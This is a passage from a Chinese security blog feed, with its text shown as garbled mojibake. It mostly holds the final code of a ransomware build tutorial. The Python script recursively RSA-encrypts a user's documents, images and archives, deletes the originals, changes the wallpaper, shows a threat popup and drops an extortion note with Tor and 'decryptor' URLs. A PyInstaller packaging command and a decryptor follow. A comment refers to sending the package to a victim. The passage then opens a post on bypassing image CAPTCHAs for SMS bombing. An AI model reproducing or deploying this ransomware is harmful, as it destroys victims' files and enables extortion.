è½½èµ„æºæ–‡ä»¶</li><li>-i   åŠ è½½å›¾æ ‡æ–‡ä»¶</li><li>-F  åŠ è½½è„šæœ¬æ–‡ä»¶</li><li>wï¼šæ‰§è¡Œæ–‡ä»¶æ—¶ä¸æ˜¾ç¤ºæ§åˆ¶å°</li></ul><p>åŒæ—¶è¿™å—è¦æ³¨æ„ï¼Œç¡®ä¿åœ¨æ‰“åŒ…æ—¶æ­£ç¡®å¼•ç”¨è¿™äº›èµ„æºæ–‡ä»¶ã€‚åœ¨ Python ä»£ç ä¸­ï¼Œé€šå¸¸ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ¥è®¿é—®è¿™äº›æ–‡ä»¶</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”Ÿæˆèµ„æºæ–‡ä»¶ç›®å½•è®¿é—®è·¯å¾„</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#æ˜¯å¦Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061749643.png" alt="image.png"> </p><h4 id="æŠ¥é”™è§£å†³"><a href="#æŠ¥é”™è§£å†³" class="headerlink" title="æŠ¥é”™è§£å†³"></a>æŠ¥é”™è§£å†³</h4><p>æ‰“åŒ…å¥½ä¹‹åï¼Œçªç„¶æƒ³èµ·æ¥ï¼Œç”Ÿæˆçš„æ–‡ä»¶æ˜¯exeæ ¼å¼çš„ï¼Œé‚£ä¹ˆä¹Ÿå°±éœ€è¦å°†è¯¥æ–‡ä»¶æ’é™¤åœ¨è¢«å‹’ç´¢æ–‡ä»¶å¤–ï¼š</p><p>å½“å°†Pythonè„šæœ¬æ‰“åŒ…æˆå¯æ‰§è¡Œçš„exeæ–‡ä»¶åï¼Œè·å–è‡ªèº«æ–‡ä»¶åçš„ä¼ ç»Ÿæ–¹æ³•ï¼ˆå¦‚ä½¿ç”¨sys.argv[0]ï¼‰å¯èƒ½ä¸å†é€‚ç”¨ï¼Œå› ä¸ºæ‰“åŒ…åçš„exeæ–‡ä»¶å¯èƒ½ä¸å†ç›´æ¥é€šè¿‡Pythonè§£é‡Šå™¨è¿è¡Œã€‚</p><p>ä¸è¿‡ï¼Œå¯ä»¥ä½¿ç”¨osæ¨¡å—ä¸­çš„pathå‡½æ•°æ¥è·å–å½“å‰è¿è¡Œçš„exeæ–‡ä»¶çš„åç§°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰è¿è¡Œçš„exeæ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line">exe_path = os.path.abspath(sys.executable)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ–‡ä»¶å</span></span><br><span class="line">exe_name = os.path.basename(exe_path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å½“å‰è¿è¡Œçš„exeæ–‡ä»¶åæ˜¯ï¼š<span class="subst">&#123;exe_name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>è„šæœ¬æ–‡ä»¶ä»£ç ä¿®æ”¹ä¸ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750433.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750355.png" alt="image.png"> </p><h3 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750849.png" alt="image.png"> </p><h3 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"><span class="keyword">import</span> win32gui, win32con</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ç”Ÿäº§1024ä½å…¬ç§é’¥å¹¶ä¿å­˜ä¸º.pem  å…ˆåœ¨æœ¬åœ°ç”Ÿæˆï¼Œå°†ç”Ÿæˆçš„å…¬é’¥å’ŒåŠ å¯†ç¨‹åºä¸€èµ·æ‰“åŒ…å‘é€åˆ°å—å®³è€…å³å¯</span></span><br><span class="line"><span class="comment"># pub, priv = rsa.newkeys(1024)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pub = pub.save_pkcs1()</span></span><br><span class="line"><span class="comment"># with open(f&quot;./keys/pubkey.pem&quot;, mode=&quot;wb&quot;) as file:</span></span><br><span class="line"><span class="comment">#     file.write(pub)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># priv = priv.save_pkcs1()</span></span><br><span class="line"><span class="comment"># with open(f&quot;./keys/privkey.pem&quot;, mode=&quot;wb&quot;) as file:</span></span><br><span class="line"><span class="comment">#     file.write(priv)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é¢„å®šä¹‰æƒ³è¦åŠ å¯†çš„æ–‡ä»¶åç¼€åï¼Œå¯ä»¥è‡ªå·±é€‰æ‹©</span></span><br><span class="line">target_list_str = <span class="string">&quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”Ÿæˆèµ„æºæ–‡ä»¶ç›®å½•è®¿é—®è·¯å¾„</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#æ˜¯å¦Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†è¿‡ç¨‹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">filename</span>):</span><br><span class="line">    pubkey_name = resource_path(os.path.join(<span class="string">&quot;res&quot;</span>,<span class="string">&quot;pubkey.pem&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pubkey_name) <span class="keyword">as</span> file:  <span class="comment">#åŠ è½½RSAå…¬é’¥ï¼Œå‡†å¤‡åŠ å¯†</span></span><br><span class="line">            pub = file.read()</span><br><span class="line">            pub = rsa.PublicKey.load_pkcs1(pub)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># åˆ é™¤åŸå§‹æ–‡ä»¶</span></span><br><span class="line">        os.remove(filename)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">117</span>):</span><br><span class="line">            res.append(rsa.encrypt(data[i:i + <span class="number">117</span>], pub))</span><br><span class="line">        byte_data = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line">        byte_data = base64.b64encode(byte_data).decode()</span><br><span class="line"> </span><br><span class="line">        filename = filename + <span class="string">&quot;.enc&quot;</span> <span class="comment">#åŠ å¯†åçš„æ–‡ä»¶åç¼€åæ”¹ä¸º.enc</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byte_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»è¦ä½œç”¨å°±æ˜¯åˆ—å‡ºæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå®ç°å…¨æ–‡ä»¶åŠ å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            <span class="comment"># å®šä¹‰æ’é™¤åŠ å¯†çš„åˆ—è¡¨</span></span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">&quot;extortion_Readme.txt&quot;</span> <span class="keyword">or</span>  file_name == <span class="string">&quot;background.png&quot;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> file_name == exe_name:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå‘Šè­¦å¼¹çª—</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># éšè—ä¸»çª—å£</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># å¼¹å‡ºæ¶ˆæ¯æ¡†</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;Warnning!!!&quot;</span>, <span class="string">&quot;æŠ±æ­‰ï¼Œä½ çš„ç”µè„‘å·²ç»è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œé‡Œé¢éƒ¨åˆ†æ–‡ä»¶å·²ç»è¢«åŠ å¯†ï¼Œå¦‚æœæƒ³è¦æ¢å¤ï¼Œè¯·åŠæ—¶è”ç³»æˆ‘ä»¬~&quot;</span>)</span><br><span class="line">    <span class="comment"># å…³é—­Tkinter</span></span><br><span class="line">    root.destroy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹æ¡Œé¢èƒŒæ™¯</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_wallpaper</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># SPI_SETDESKWALLPAPER = 20</span></span><br><span class="line">    <span class="comment"># SPIF_UPDATEINIFILE = 0x01</span></span><br><span class="line">    <span class="comment"># SPIF_SENDCHANGE = 0x02</span></span><br><span class="line">    <span class="comment"># è¿”å›å€¼ï¼šå¦‚æœå‡½æ•°è°ƒç”¨æˆåŠŸï¼Œè¿”å›å€¼éé›¶ï¼›å¦‚æœå‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œè¿”å›å€¼ä¸ºé›¶ã€‚</span></span><br><span class="line">    <span class="comment"># ä¿®æ”¹æ¡Œé¢èƒŒæ™¯</span></span><br><span class="line">    <span class="keyword">return</span> win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER,</span><br><span class="line">                                          image_path,</span><br><span class="line">                                          win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_letter</span>():</span><br><span class="line">    file_name = <span class="string">&quot;extortion_Readme.txt&quot;</span></span><br><span class="line">    <span class="comment"># è¦å†™å…¥çš„å†…å®¹</span></span><br><span class="line">    content = <span class="string">&quot;---=== Welcome. Again ===---\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] What Happen? [+]\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Your files are encrypted and currently unavailable. You can check it all files on the system do not open properly.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;By the way, everything is possible to recover(restore), but you need to follow our instructions. Otherwise, you can&#x27;t return your data (Never).\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] What guarantees? [+]&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Its just a business. We absolutely do not care you and your deals, except getting benefits. If we do not do our work and liabilities - \n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;nobody will not cooperate with us, Its not in our interests.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;To check the ability of returning files, you should go to our website. there you can decrypt one file and free. That isi our guarantee.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the \n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;private key. In practice - time is much more valuable than money.\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] How to get access on website? [+]\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;You have two ways:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;1) [Recommended] Using a Tor brower!\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    a) Download and install Tor brower from this site: https://torproject.org\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    b) open our website: http://aplwbzo468w90726424023846238690283.coion/CE2937HFJJK\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;2) If Tor blocked in your country, try to use VPN! But you can use our secondary website. for this:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    a) Open your any brower (Chrome, Opera, IE, Edge)\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    b) Open our secondary website: http://decryptor.cc/CE2937HFJJK\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Warnning secondary website can be blocked, thats why first variant much better and more available.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;When you open our website, put the follow data in the input form:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Key:\n\r&quot;</span></span><br><span class="line">    <span class="comment"># åˆ›å»ºå¹¶å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    file_path = os.path.abspath(file_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">    os.startfile(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># è·å–å½“å‰è¿è¡Œçš„exeæ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line">    exe_path = os.path.abspath(sys.executable)</span><br><span class="line">    <span class="comment"># è·å–æ–‡ä»¶å</span></span><br><span class="line">    exe_name = os.path.basename(exe_path)</span><br><span class="line"></span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line">    <span class="comment"># print(target_list)</span></span><br><span class="line">    encrypt(os.getcwd()) <span class="comment">#æ­¤å¤„è‡ªå®šä¹‰æƒ³è¦åŠ å¯†çš„ç›®å½•åç§°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½®å£çº¸çš„è·¯å¾„</span></span><br><span class="line">    image_path = resource_path(os.path.join(<span class="string">&quot;res&quot;</span>,<span class="string">&quot;background.png&quot;</span>))</span><br><span class="line">    <span class="comment"># print(image_path)</span></span><br><span class="line"></span><br><span class="line">    warnning()  <span class="comment"># å¼¹çª—å‘Šè­¦æ¡†</span></span><br><span class="line">    <span class="comment"># è°ƒç”¨å‡½æ•°è®¾ç½®å£çº¸</span></span><br><span class="line">    set_wallpaper(image_path)</span><br><span class="line">    <span class="comment"># ç”Ÿæˆå‹’ç´¢ä¿¡å¹¶æ‰“å¼€</span></span><br><span class="line">    write_letter()</span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€è§£å¯†æ–‡ä»¶åˆ¶ä½œ"><a href="#ä¸‰ã€è§£å¯†æ–‡ä»¶åˆ¶ä½œ" class="headerlink" title="ä¸‰ã€è§£å¯†æ–‡ä»¶åˆ¶ä½œ"></a>ä¸‰ã€è§£å¯†æ–‡ä»¶åˆ¶ä½œ</h1><p>ç›¸å¯¹äºåŠ å¯†æ–‡ä»¶ï¼Œè¿™ä¸ªå°±ç®€å•çš„å¤šäº†ã€‚åˆ†ä¸ºä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š</p><p>1ã€è°ƒç”¨ç§é’¥è§£å¯†å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰.encåç¼€çš„æ–‡ä»¶</p><p>2ã€å’Œä¸Šé¢ç±»ä¼¼ï¼Œå°†èµ„æºæ–‡ä»¶private.pemåŒè„šæœ¬æ–‡ä»¶æ‰“åŒ…æˆexe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller --add-data &#x27;./des/privkey.pem;des&#x27; -Fw .\decrypt.py</span><br></pre></td></tr></table></figure><h3 id="è§£å¯†ä»£ç å¦‚ä¸‹"><a href="#è§£å¯†ä»£ç å¦‚ä¸‹" class="headerlink" title="è§£å¯†ä»£ç å¦‚ä¸‹"></a>è§£å¯†ä»£ç å¦‚ä¸‹</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#é¢„å®šä¹‰æƒ³è¦è§£å¯†çš„æ–‡ä»¶åç¼€åï¼Œå¯ä»¥è‡ªå·±é€‰æ‹©</span></span><br><span class="line">target_list_str = <span class="string">&quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”Ÿæˆèµ„æºæ–‡ä»¶ç›®å½•è®¿é—®è·¯å¾„</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#æ˜¯å¦Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†è¿‡ç¨‹ï¼Œå½“ç„¶å¦‚æœå½“ä¸ºæ”»å‡»ç¨‹åºè‚¯å®šä¸èƒ½å‘é€åˆ°è¢«å®³è€…æœåŠ¡å™¨ï¼Œæ­¤å¤„æ˜¯ä¸ºäº†é˜²æ­¢è¯¯æ“ä½œå°†è‡ªå·±æ–‡ä»¶åŠ å¯†åçš„è¿˜åŸï¼ˆæˆ–è€…ç¡®ä¿å—å®³è€…æ— æ³•æµè§ˆåˆ°æ­¤ä»£ç ä¹Ÿå¯ä¸€èµ·å‘é€ï¼‰</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">file_name</span>):</span><br><span class="line">    prikey_name = resource_path((os.path.join(<span class="string">&quot;des&quot;</span>,<span class="string">&quot;privkey.pem&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> file_name.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">2</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(prikey_name, mode=<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            priv = file.read()</span><br><span class="line">            priv = rsa.PrivateKey.load_pkcs1(priv)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        data = base64.b64decode(data.encode())</span><br><span class="line"> </span><br><span class="line">        res = []</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">128</span>):</span><br><span class="line">            temp_plaintext = rsa.decrypt(data[i:i + <span class="number">128</span>], priv)</span><br><span class="line">            res.append(temp_plaintext)</span><br><span class="line"> </span><br><span class="line">        last = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#åˆ é™¤åŠ å¯†æ–‡ä»¶</span></span><br><span class="line">        os.remove(file_name)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name.replace(<span class="string">&quot;.enc&quot;</span>, <span class="string">&quot;&quot;</span>), mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(last)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                decrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_decrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_decrypt(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå‘Šè­¦å¼¹çª—</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># éšè—ä¸»çª—å£</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># å¼¹å‡ºæ¶ˆæ¯æ¡†</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;è§£å¯†å®Œæˆï¼ï¼ï¼&quot;</span>)</span><br><span class="line">    <span class="comment"># å…³é—­Tkinter</span></span><br><span class="line">    root.destroy()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line"></span><br><span class="line">    decrypt(os.getcwd())<span class="comment">#è§£å¯†å½“å‰æ–‡ä»¶æ‰€åœ¨ç›®å½•</span></span><br><span class="line">    warnning()</span><br></pre></td></tr></table></figure><h3 id="æ•ˆæœå±•ç¤º-1"><a href="#æ•ˆæœå±•ç¤º-1" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061752237.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥å“åº” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åº”æ€¥æ ·æœ¬ </tag>
            
            <tag> å‹’ç´¢ </tag>
            
            <tag> pyinstaller </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»•è¿‡å›¾ç‰‡éªŒè¯ç å®ç°çŸ­ä¿¡è½°ç‚¸</title>
      <link href="/2024/06/01/%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/"/>
      <url>/2024/06/01/%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h1><p>å›¾ç‰‡éªŒè¯ç æ˜¯ä¸€ç§å¸¸è§çš„å®‰å…¨éªŒè¯æ–¹å¼ï¼Œå¹¿æ³›åº”ç”¨äºç½‘ç«™ã€APPç­‰åœºæ™¯ï¼Œç”¨äºåŒºåˆ†äººç±»ç”¨æˆ·å’Œæ¶æ„æœºå™¨äººã€‚ç„¶è€Œï¼Œç”±äºè®¾è®¡æˆ–å®ç°ä¸Šçš„ç¼ºé™·ï¼Œå›¾ç‰‡éªŒè¯ç å¯èƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå¯¼è‡´çŸ­ä¿¡è½°ç‚¸æ¼æ´çš„å‘ç”Ÿã€‚</p><p>å¸¸è§çš„å›¾ç‰‡éªŒè¯ç çš„é—®é¢˜ï¼Œä¸€èˆ¬ä»¥ä¸‹å‡ ç§ï¼š</p><p>1ã€å›¾ç‰‡éªŒè¯ç å‰ç«¯ç”Ÿæˆ&amp;å‰ç«¯æ ¡éªŒï¼šé€šä¿—ç†è§£ï¼Œå°±æ˜¯è°ƒç”¨å‰ç«¯JSä¸­çš„å‡½æ•°ç”Ÿæˆä¸€ä¸ªéªŒè¯ç ï¼Œé‚£è‡ªç„¶äººå·¥è¾“å…¥çš„éªŒè¯ç æ ¡éªŒä¹Ÿæ˜¯åœ¨å‰ç«¯å®Œæˆçš„ï¼Œè¿™ç§æ²¡å•¥ç”¨ï¼Œå½¢åŒè™šè®¾ã€‚</p><p>2ã€å›¾ç‰‡éªŒè¯ç ä¸å¤±æ•ˆï¼šä¹Ÿå°±æ˜¯æœåŠ¡ç«¯è¿”å›éªŒè¯ç ä¹‹åï¼Œåªè¦ä¸å†æ¬¡è¯·æ±‚ï¼Œå°±ä¸€ç›´å¯ä»¥ä½¿ç”¨ï¼Œè¿™ä¹Ÿæ˜¯å¥½å¤šå¹´ä¹‹å‰çš„ç³»ç»Ÿå¸¸è§çš„éªŒè¯ç æ¼æ´ã€‚</p><p>3ã€éªŒè¯ç å¯è¯†åˆ«ï¼šè¿™ç©æ„å°±æ¯”è¾ƒé¸¡è‚‹äº†ï¼Œä¸»è¦ä¹Ÿæ˜¯å€Ÿç”¨ä¸€äº›ç¬¬ä¸‰æ–¹çš„ocråšè¯†åˆ«ï¼Œæ¯”è¾ƒå¥½ç”¨çš„å°±æ˜¯Pythonçš„ç¬¬ä¸‰æ–¹åº“â€”ddddocräº†ã€‚</p><h1 id="äºŒã€æ¡ˆä¾‹ä¸€"><a href="#äºŒã€æ¡ˆä¾‹ä¸€" class="headerlink" title="äºŒã€æ¡ˆä¾‹ä¸€"></a>äºŒã€æ¡ˆä¾‹ä¸€</h1><h2 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h2><p>æŸé‡‘èç«™ç‚¹é¦–é¡µï¼Œé€šè¿‡çŸ­ä¿¡éªŒè¯ç ç™»å½•ï¼Œåœ¨ç‚¹å‡»å‘é€çŸ­ä¿¡çš„æ—¶å€™ï¼Œä¼šå¼¹å‡ºå›¾ç‰‡éªŒè¯ç ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012225238.png" alt="img">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012244906.png" alt="image-20240601224405877"> </p><p>æˆåŠŸè¾“å…¥å›¾ç‰‡éªŒè¯ç 